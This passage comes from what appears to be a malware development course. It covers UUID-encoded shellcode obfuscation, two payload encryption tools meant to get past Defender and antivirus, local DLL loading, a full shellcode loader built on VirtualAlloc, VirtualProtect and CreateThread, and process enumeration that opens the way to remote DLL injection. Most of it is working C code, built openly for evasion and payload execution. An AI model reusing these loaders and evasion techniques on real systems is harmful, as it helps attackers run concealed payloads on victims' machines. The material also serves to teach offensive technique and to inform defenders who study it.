	// Combining Output0,1,2,3 to generate the UUID
	sprintf(result, "%s-%s-%s%s", Output0, Output1, Output2, Output3);

	//printf("[i] result: %s\n", (char*)result);
	return (char*)result;
}



// Generate the UUID output representation of the shellcode
// Function requires a pointer or base address to the shellcode buffer & the size of the shellcode buffer
BOOL GenerateUuidOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
	// If the shellcode buffer is null or the size is not a multiple of 16, exit
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 16 != 0) {
		return FALSE;
	}
	printf("char* UuidArray[%d] = { \n\t", (int)(ShellcodeSize / 16));

	// We will read one shellcode byte at a time, when the total is 16, begin generating the UUID string
	// The variable 'c' is used to store the number of bytes read. By default, starts at 16.
	int c = 16, counter = 0;
	char* UUID = NULL;

	for (int i = 0; i < ShellcodeSize; i++) {
		// Track the number of bytes read and when they reach 16 we enter this if statement to begin generating the UUID string
		if (c == 16) {
			counter++;

			// Generating the UUID string from 16 bytes which begin at i until [i + 15]
			UUID = GenerateUUid(
				pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3],
				pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6], pShellcode[i + 7],
				pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11],
				pShellcode[i + 12], pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]
			);
			if (i == ShellcodeSize - 16) {

				// Printing the last UUID string
				printf("\"%s\"", UUID);
				break;
			}
			else {
				// Printing the UUID string
				printf("\"%s\", ", UUID);
			}
			c = 1;
			// Optional: To beautify the output on the console
			if (counter % 3 == 0) {
				printf("\n\t");
			}
		}
		else {
			c++;
		}
	}
	printf("\n};\n\n");
	return TRUE;
}
```

#### UUID Deobfuscation Implementation

Although different segments have different endianness, that will not affect the deobfuscation process because the??[UuidFromStringA](https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa)??WinAPI takes care of this.

```c

typedef RPC_STATUS (WINAPI* fnUuidFromStringA)(
	RPC_CSTR	StringUuid,
	UUID*		Uuid
);

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

        PBYTE          pBuffer         = NULL,
                       TmpBuffer       = NULL;

        SIZE_T         sBuffSize       = NULL;

        RPC_STATUS     STATUS          = NULL;

	// Getting UuidFromStringA address from Rpcrt4.dll
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of UUID strings * 16
	sBuffSize = NmbrOfElements * 16;

	// Allocating memory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;

	// Loop through all the UUID strings saved in UuidArray
	for (int i = 0; i < NmbrOfElements; i++) {
		
		// Deobfuscating one UUID string at a time
		// UuidArray[i] is a single UUID string from the array UuidArray
		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			// if it failed
			printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
			return FALSE;
		}

		// 16 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 16);

	}

	*ppDAddress = pBuffer;
	*pDSize     = sBuffSize;

	return TRUE;
}
```

The image below shows the deobfuscation process successfully running.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/uuidfuscation.png)
# 3.2 Maldev Academy Tool - HellShell

### Introduction

At this point of the course, one should have a solid grasp of static evasion using encryption (XOR/RC4/AES) and obfuscation (IPv4/IPv6/MAC/UUID) techniques. Implementing one or more of the previously discussed evasion techniques in the malware can be time-consuming. One solution is to build a tool that takes in the payload and performs the encryption or obfuscation methods.

This module will demo a tool made by the Maldev Academy team that performs these tasks.

### Tool Features

The tool has the following features:

- Supports IPv4/IPv6/MAC/UUID Obfuscation
    
- Supports XOR/RC4/AES encryption
    
- Supports payload padding
    
- Provides the decryption function for the selected encryption/obfuscation technique
    
- Randomly generated encryption keys on every run
    

### Usage

To use HellShell, download the source code and compile it manually. Ensure the build option is set to??_Release_.

```c
                            ###########################################################
                            # HellShell - Designed By MalDevAcademy @NUL0x4C | @mrd0x #
                            ###########################################################

[!] Usage: HellShell.exe <Input Payload FileName> <Enc/Obf *Option*>
[i] Options Can Be :
        1.>>> "mac"     ::: Output The Shellcode As A Array Of Mac Addresses  [FC-48-83-E4-F0-E8]
        2.>>> "ipv4"    ::: Output The Shellcode As A Array Of Ipv4 Addresses [252.72.131.228]
        3.>>> "ipv6"    ::: Output The Shellcode As A Array Of Ipv6 Addresses [FC48:83E4:F0E8:C000:0000:4151:4150:5251]
        4.>>> "uuid"    ::: Output The Shellcode As A Array Of UUid Strings   [FC4883E4-F0E8-C000-0000-415141505251]
        5.>>> "aes"     ::: Output The Shellcode As A Array Of Aes Encrypted Shellcode With Random Key And Iv
        6.>>> "rc4"     ::: Output The Shellcode As A Array Of Rc4 Encrypted Shellcode With Random Key

```

### Example Commands

- `HellShell.exe calc.bin aes`??- Generates an AES encrypted payload and prints it to the console
    
- `HellShell.exe calc.bin aes > AesPayload.c`??- Generates an AES-encrypted payload and outputs it to??`AesPayload.c`
    
- `HellShell.exe calc.bin ipv6`??- Generates an IPv6 obfuscated payload and prints it to the console
    

### Demo

The image below shows HellShell being used to encrypt the payload using the RC4 encryption algorithm and outputting to a file.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/hellshell.png)
# 3.3 Maldev Academy Tool - MiniShell

### Introduction

This is another Maldev Academy tool, similar to??`HellShell`, which allows encryption of raw payloads. The tool only supports RC4 and AES.

### Features

- Outputs the decryption function of the selected encryption type
    
- Outputs the encrypted bytes as a??`bin`??file
    
- Randomly generated keys for the encryption algorithms
    

### Usage

```c
                         ###########################################################
                         # MiniShell - Designed By MalDevAcademy @NUL0x4C | @mrd0x #
                         ###########################################################

[!] Usage: C:\Users\User\source\repos\MiniShell\x64\Debug\MiniShell.exe <Input Payload FileName> <Enc *Option*>  <Output FileName>
[i] Encryption Options Can Be :
        1.>>> "aes"     ::: Output The File As A Encrypted File Using AES-256 Algorithm With Random Key And IV
        2.>>> "rc4"     ::: Output The File As A Encrypted File Using Rc4 Algorithm With Random Key
```

### Examples

- `.\MiniShell.exe .\calc.bin rc4 encpayload.bin`??- Use RC4 for encryption, write the encrypted bytes to??`encpayload.bin`, output the decryption functionality to the console
    
- `.\MiniShell.exe .\calc.bin rc4 encpayload.bin > rc4.c`??- Use RC4 for encryption, write the encrypted bytes to??`encpayload.bin`??- output the decryption function to??`rc4.c`.
    
- `.\MiniShell.exe .\calc.bin aes calcenc.bin`??- Use AES for encryption, write the encrypted bytes to??`calcenc.bin`, and output the decryption function to the console.
    
- `.\MiniShell.exe .\calc.bin aes calcenc.bin > aes.c`??- Use AES for encryption, write the encrypted bytes to??`calcenc.bin`, and output the decryption function to??`aes.c`.
    

### Demo

The image below shows??`MiniShell`??being used to encrypt the??`calc.bin`??file with the encrypted bytes being written to??`AesCalc.bin`??and the decryption function being saved to??`Aes.c`.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/minishell-updated.png)
# 3.4 Local Payload Execution - DLL

### Introduction

This module explores the usage of Dynamic Link Libraries (DLLs) as payloads and demonstrates how to load a malicious DLL file in the current process.

### Creating a DLL

Creating a DLL is simple and can be done using Visual Studio. Create a new project, set the programming language to C++, and finally select Dynamic-Link Library (DLL). This will create a DLL skeleton code that will be modified throughout the remainder of this module. For a refresher as to how DLLs work, feel free to review the introductory DLL module.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-a-dll.png)

### DLL Setup

This demo will utilize a message box that appears when the DLL is successfully loaded. Creating a message box can be easily done with the??[MessageBox](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa)??WinAPI. The code snippet below will run??`MsgBoxPayload`??whenever the DLL is loaded into a process. Note that the precompiled headers were removed from the project's C/C++ settings as shown in the introductory??_Dynamic-Link Library_??module.

```c
#include <Windows.h>
#include <stdio.h>

VOID MsgBoxPayload() {
    MessageBoxA(NULL, "Hacking With MaldevAcademy", "Wow !", MB_OK | MB_ICONINFORMATION);
}


BOOL APIENTRY DllMain (HMODULE hModule, DWORD dwReason, LPVOID lpReserved){

    switch (dwReason){
        case DLL_PROCESS_ATTACH: {
            MsgBoxPayload();
            break;
        };
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}
```

### Local Injection

Recall that the??`LoadLibrary`??WinAPI is used to load a DLL. The function takes a DLL path on disk and loads it into the address space of the calling process, which in our case will be the current process. Loading the DLL will run its entry point, and thus run the??`MsgBoxPayload`??function, making the message box appear. Although the concept is simple, it will become useful in later modules to understand more complex techniques.

The code below will take the DLL's name as a command line argument, load it using??`LoadLibraryA`, and perform some error checking to ensure the DLL loaded successfully.

```c
#include <Windows.h>
#include <stdio.h>


int main(int argc, char* argv[]) {

	if (argc < 2){
		printf("[!] Missing Argument; Dll Payload To Run \n");
		return -1;
	}

	printf("[i] Injecting \"%s\" To The Local Process Of Pid: %d \n", argv[1], GetCurrentProcessId());
	
	
	printf("[+] Loading Dll... ");
	if (LoadLibraryA(argv[1]) == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[+] DONE ! \n");

	
	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}

```

#### Output

As expected, the message box successfully appears after injecting the DLL.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/dll-injection-execution.png)

### Process Analysis

To further verify that the DLL is loaded in the process, run Process Hacker, double-click the process which loaded the DLL and head to the "Modules" tab. The DLL's name should appear in the list of modules. Clicking on the DLL's name will retrieve additional information about it such as imports, whether it's signed and section names.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/task-manager-dll.png)
# 3.5 Local Payload Execution - Shellcode

### Introduction

This module will discuss one of the simplest ways to execute shellcode via the creation of a new thread. Although this technique is simple, it's crucial to understand how it works as it lays the groundwork for more advanced shellcode execution methods.

The method discussed in this module utilizes??`VirtualAlloc`,??`VirtualProtect`??and??`CreateThread`??Windows APIs. It's important to note that this method is by no means a stealthy technique and EDRs will almost certainly detect this simple shellcode execution technique. On the other hand, antiviruses can potentially be bypassed using this method with sufficient obfuscation.

### Required Windows APIs

A good starting point would be to have a look at the documentation for the Windows APIs that will be utilized:

- [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)??- Allocates memory which will be used to store the payload
    
- [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)??- Change the memory protection of the allocated memory to be executable in order to execute the payload.
    
- [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)??- Creates a new thread that runs the payloads
    

### Obfuscating Payload

The payload used in this module will be the Msfvenom generated x64 calc payload. To make the demo realistic, evading Defender will be attempted and therefore obfuscating or encrypting the payload will be necessary. HellShell, which was introduced in an earlier module, will be used to obfuscate the payload. Run the following command:

`HellShell.exe msfvenom.bin uuid`

The output should be saved to the??`UuidArray`??variable.

### Allocating Memory

[VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)??is used to allocate memory of size??`sDeobfuscatedSize`. The size of??`sDeobfuscatedSize`??is determined by the??`UuidDeobfuscation`??function, which returns the total size of the deobfuscated payload.

The??`VirtualAlloc`??WinAPI function looks like the following based on its documentation

```c
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,          // The starting address of the region to allocate (set to NULL)
  [in]           SIZE_T dwSize,             // The size of the region to allocate, in bytes
  [in]           DWORD  flAllocationType,   // The type of memory allocation
  [in]           DWORD  flProtect           // The memory protection for the region of pages to be allocated
);
```

The type of memory allocation is specified as??`MEM_RESERVE | MEM_COMMIT`??which will reserve a range of pages in the virtual address space of the calling process and commit physical memory to those reserved pages, the combined flags are discussed separately as the following:

- `MEM_RESERVE`??is used to reserve a range of pages without actually committing physical memory.
    
- `MEM_COMMIT`??is used to commit a range of pages in the virtual address space of the process.
    

The last parameter of??`VirtualAlloc`??sets the permissions on the memory region. The easiest way would be to set the memory protection to??`PAGE_EXECUTE_READWRITE`??but that is generally an indicator of malicious activity for many security solutions. Therefore the memory protection is set to??`PAGE_READWRITE`??since at this point only writing the payload is required but executing it isn't. Finally,??`VirtualAlloc`??will return the base address of the allocated memory.

### Writing Payload To Memory

Next, the deobfuscated payload bytes are copied into the newly allocated memory region at??`pShellcodeAddress`??and then clean up??`pDeobfuscatedPayload`??by overwriting it with 0s.??`pDeobfuscatedPayload`??is the base address of a heap allocated by the??`UuidDeobfuscation`??function which returns the raw shellcode bytes. It has been overridden with zeroes since it is not required anymore and therefore this will reduce the possibility of security solutions finding the payload in memory.

### Modifying Memory Protection

Before the payload can be executed, the memory protection must be changed since at the moment only read/write is permitted.??`VirtualProtect`??is used to modify the memory protections and for the payload to execute it will need either??`PAGE_EXECUTE_READ`??or??`PAGE_EXECUTE_READWRITE`.

The??`VirtualProtect`??WinAPI function looks like the following based on its documentation

```c
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,       // The base address of the memory region whose access protection is to be changed
  [in]  SIZE_T dwSize,          // The size of the region whose access protection attributes are to be changed, in bytes
  [in]  DWORD  flNewProtect,    // The new memory protection option
  [out] PDWORD lpflOldProtect   // Pointer to a 'DWORD' variable that receives the previous access protection value of 'lpAddress'
);
```

Although some shellcode does require??`PAGE_EXECUTE_READWRITE`, such as self-decrypting shellcode, the Msfvenom x64 calc shellcode does not need it but the code snippet below uses that memory protection.

### Payload Execution Via CreateThread

Finally, the payload is executed by creating a new thread using the??`CreateThread`??Windows API function and passing??`pShellcodeAddress`??which is the shellcode address.

The??`CreateThread`??WinAPI function looks like the following based on its documentation

```c
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,    // Set to NULL - optional
  [in]            SIZE_T                  dwStackSize,           // Set to 0 - default
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,        // Pointer to a function to be executed by the thread, in our case its the base address of the payload
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,           // Pointer to a variable to be passed to the function executed (set to NULL - optional)
  [in]            DWORD                   dwCreationFlags,       // Set to 0 - default
  [out, optional] LPDWORD                 lpThreadId             // pointer to a 'DWORD' variable that receives the thread ID (set to NULL - optional)   
);
```

### Payload Execution Via Function Pointer

Alternatively, there is a simpler way to run the shellcode without using the??`CreateThread`??Windows API. In the example below, the shellcode is casted to a??`VOID`??function pointer and the shellcode is executed as a function pointer. The code essentially jumps to the??`pShellcodeAddress`??address.

```c
    (*(VOID(*)()) pShellcodeAddress)();
```

That is equivalent to running the code below.

```c
    typedef VOID (WINAPI* fnShellcodefunc)();       // Defined before the main function
    fnShellcodefunc pShell = (fnShellcodefunc) pShellcodeAddress;
    pShell();
```

### CreateThread vs Function Pointer Execution

Although it is possible to execute shellcode using the function pointer method, it's generally not recommended. The Msfvenom-generated shellcode terminates the calling thread after it's done executing. If the shellcode was executed using the function pointer method, then the calling thread will be the main thread and therefore the entire process will exit after the shellcode is finished executing.

Executing the shellcode in a new thread prevents this problem because if the shellcode is done executing, the new worker thread will be terminated rather than the main thread, preventing the whole process from termination.

### Waiting For Thread Execution

Executing the shellcode using a new thread without a short delay increases the likelihood of the main thread finishing execution before the worker thread that runs the shellcode has completed its execution, leading to the shellcode not running correctly. This scenario is illustrated in the code snippet below.

```c
int main(){
    
    // ...
    
    CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL); // Shellcode execution
    return 0; // The main thread is done executing before the thread running the shellcode
}
```

In the provided implementation,??`getchar()`??is used to pause the execution until the user provides input. In real implementations, a different approach should be used which utilizes the??[WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)??WinAPI to wait for a specified time until the thread executes.

The snippet below uses??`WaitForSingleObject`??to wait for the newly created thread to finish executing for??`2000`??milliseconds before executing the remaining code.

```c
HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, 2000);

// Remaining code

```

In the example below,??`WaitForSingleObject`??will wait forever for the new thread to finish executing.

```c
HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, INFINTE);

```

### Main Function

The main function uses??`UuidDeobfuscation`??to deobfuscate the payload, then allocates memory, copies the shellcode to the memory region and executes it.

```c
int main() {

    PBYTE       pDeobfuscatedPayload  = NULL;
    SIZE_T      sDeobfuscatedSize     = NULL;

    printf("[i] Injecting Shellcode The Local Process Of Pid: %d \n", GetCurrentProcessId());
    printf("[#] Press <Enter> To Decrypt ... ");
    getchar();

    printf("[i] Decrypting ...");
    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        return -1;
    }
    printf("[+] DONE !\n");
    printf("[i] Deobfuscated Payload At : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

    printf("[#] Press <Enter> To Allocate ... ");
    getchar();
    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return -1;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();
    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
    memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);


    DWORD dwOldProtection = NULL;

    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return -1;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return -1;
    }

    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    printf("[#] Press <Enter> To Quit ... ");
    getchar();
    return 0;
}
```

### Deallocating Memory

[VirtualFree](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree)??is a WinAPI that is used to deallocate previously allocated memory. This function should only be called after the payload has fully finished execution otherwise it might free the payload's content and crash the process.

```c
BOOL VirtualFree(
  [in] LPVOID lpAddress,
  [in] SIZE_T dwSize,
  [in] DWORD  dwFreeType
);
```

`VirtualFree`??takes the base address of the allocated memory to be freed (`lpAddress`), the size of the memory to free (`dwSize`) and the type of free operation (`dwFreeType`) which can be one of the following flags:

- `MEM_DECOMMIT`??- The??`VirtualFree`??call will release the physical memory without releasing the virtual address space that is linked to it. As a result, the virtual address space can still be used to allocate memory in the future, but the pages linked to it are no longer supported by physical memory.
    
- `MEM_RELEASE`??- Both the virtual address space and the physical memory associated with the virtual memory allocated, are freed. Note that according to Microsoft's documentation, when this flag is used the??`dwSize`??parameter must be 0.
    

### Debugging

In this section, the implementation is debugged using the xdbg debugger to further understand what is happening under the hood.

First, verify the output of the??`UuidDeobfuscation`??function to ensure valid shellcode is being returned. The image below shows that the shellcode is being deobfuscated successfully.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/local-shellcode-injection-1.png)

  

The next step is to check that memory is being allocated using the??`VirtualAlloc`??Windows API. Again, looking at the memory map at the bottom left it shows that memory is allocated and was populated with zeroes.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/local-shellcode-injection-2.png)

  

After the memory was successfully allocated, the deobfuscated payload is written to the memory buffer.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/local-shellcode-injection-3.png)

  

Recall that??`pDeobfuscatedPayload`??was zeroed out to avoid having the deobfuscated payload in memory where it's not being used. The buffer should be zeroed out completely.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/local-shellcode-injection-4.png)

  

Finally, the shellcode is executed and as expected the calculator application appears.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/local-shellcode-injection-5.png)

  

The shellcode can be seen inside Process Hacker's memory tab. Notice how our allocated memory region has??`RWX`??memory protection which stands out and therefore is usually a malicious indicator.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/local-shellcode-injection-6.png)
# 3.6 Process Injection - DLL Injection

### Introduction

This module will demonstrate a similar method to the one that was previously shown with the local DLL injection except it will now be performed on a remote process.

### Enumerating Processes

Before being able to inject a DLL into a process, a target process must be chosen. Therefore the first step to remote process injection is usually to enumerate the running processes on the machine to know of potential target processes that can be injected. The process ID (or PID) is required to open a handle to the target process and allow the necessary work to be done on the target process.

This module creates a function that performs process enumeration to determine all the running processes. The function??`GetRemoteProcessHandle`??will be used to perform an enumeration of all running processes on the system, opening a handle to the target process and returning both PID and handle to the process.

### CreateToolhelp32Snapshot

The code snippet starts by using??[CreateToolhelp32Snapshot](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)??with the??`TH32CS_SNAPPROCESS`??flag for its first parameter, which takes a snapshot of all processes running on the system at the moment the function is executed.

```c
// Takes a snapshot of the currently running processes 
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
```

### PROCESSENTRY32 Structure

Once the snapshot is taken,??[Process32First](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)??is used to get information for the first process in the snapshot. For all the remaining processes in the snapshot,??[Process32Next](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)??is used.

Microsoft's documentation states that both??`Process32First`??and??`Process32Next`??require a??[PROCESSENTRY32](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32)??structure to be passed in for their second parameter. After the struct is passed in, the functions will populate the struct with information about the process. The??`PROCESSENTRY32`??struct is shown below with comments beside the useful members of the struct that will be populated by these functions.

```c
typedef struct tagPROCESSENTRY32 {
  DWORD     dwSize;
  DWORD     cntUsage;
  DWORD     th32ProcessID;              // The process ID
  ULONG_PTR th32DefaultHeapID;
  DWORD     th32ModuleID;
  DWORD     cntThreads;
  DWORD     th32ParentProcessID;        // Process ID of the parent process
  LONG      pcPriClassBase;
  DWORD     dwFlags;
  CHAR      szExeFile[MAX_PATH];        // The name of the executable file for the process
} PROCESSENTRY32;
```

After??`Process32First`??or??`Process32Next`??populate the struct, the data can be extracted from the struct by using the dot operator. For example, to extract the PID use??`PROCESSENTRY32.th32ProcessID`.

### Process32First & Process32Next

As previously mentioned,??`Process32First`??is used to get information for the first process and??`Process32Next`??for all the remaining processes in the snapshot using a do-while loop. The process name that's being searched for,??`szProcessName`, is compared against the process name in the current loop iteration which is extracted from the populated structure,??`Proc.szExeFile`. If there is a match then the process ID is saved and a handle is opened for that process.

```c
// Retrieves information about the first process encountered in the snapshot.
if (!Process32First(hSnapShot, &Proc)) {
	printf("[!] Process32First Failed With Error : %d \n", GetLastError());
	goto _EndOfFunction;
}

do {
	// Use the dot operator to extract the process name from the populated struct
	// If the process name matches the process we're looking for
	if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
		// Use the dot operator to extract the process ID from the populated struct
		// Save the PID
		*dwProcessId  = Proc.th32ProcessID;
		// Open a handle to the process
		*hProcess     = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
		if (*hProcess == NULL)
			printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

		break; // Exit the loop
	}

// Retrieves information about the next process recorded the snapshot.
// While a process still remains in the snapshot, continue looping
} while (Process32Next(hSnapShot, &Proc));
```

### Process Enumeration - Code

```c
BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	// According to the documentation:
	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
	// If dwSize is not initialized, Process32First fails.
	PROCESSENTRY32	Proc = {
		.dwSize = sizeof(PROCESSENTRY32) 
	};

	HANDLE hSnapShot = NULL;

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE){
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		// Use the dot operator to extract the process name from the populated struct
		// If the process name matches the process we're looking for
		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
			// Use the dot operator to extract the process ID from the populated struct
			// Save the PID
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break; // Exit the loop
		}

	// Retrieves information about the next process recorded the snapshot.
	// While a process still remains in the snapshot, continue looping
	} while (Process32Next(hSnapShot, &Proc));
	
	// Cleanup
	_EndOfFunction:
		if (hSnapShot != NULL)
			CloseHandle(hSnapShot);
		if (*dwProcessId == NULL || *hProcess == NULL)
			return FALSE;
		return TRUE;
}

```

#### Microsoft's Example

Another process enumeration example is available for viewing??[here](https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes).

### Case Sensitive Process Name

The code snippet above contains one flaw that was overlooked which can lead to inaccurate results. The??`wcscmp`??function was used to compare the process names, but the case sensitivity was not taken into account which means??`Process1.exe`??and??`process1.exe`??will be considered two different processes.

The code snippet below fixes this issue by converting the value in the??`Proc.szExeFile`??member to a lowercase string and then comparing it to??`szProcessName`. Therefore,??`szProcessName`??must always be passed in as a lowercase string.

```c
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	// According to the documentation:
	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
	// If dwSize is not initialized, Process32First fails.
	PROCESSENTRY32	Proc = {
		.dwSize = sizeof(PROCESSENTRY32) 
	};

	HANDLE hSnapShot = NULL;

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE){
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Converting each charachter in Proc.szExeFile to a lower case character
			// and saving it in LowerName
			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// If the lowercase'd process name matches the process we're looking for
		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the PID
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

	// Retrieves information about the next process recorded the snapshot.
	// While a process still remains in the snapshot, continue looping
	} while (Process32Next(hSnapShot, &Proc));

	// Cleanup
	_EndOfFunction:
		if (hSnapShot != NULL)
			CloseHandle(hSnapShot);
		if (*dwProcessId == NULL || *hProcess == NULL)
			return FALSE;
		return TRUE;
	}
```

### DLL Injection

A process handle to the target process has been successfully retrieved. The next step is to inject the DLL into the target process which will require the use of several Windows APIs that were previously used and some new ones.

- [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)??- Similar to??`VirtualAlloc`??except it allows for memory allocation in a remote process.
    
- [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)??- Writes data to the remote process. In this case, it will be used to write the DLL's path to the target process.
    
- [CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)??- Creates a thread in the remote process
    

### Code Walkthrough

This section will walk through the DLL injection code (shown below). The function??`InjectDllToRemoteProcess`??takes two arguments:

1. Process Handle - This is a HANDLE to the target process which will have the DLL injected into it.
    
2. DLL name - The full path to the DLL that will be injected into the target process.
    

#### Find LoadLibraryW Address

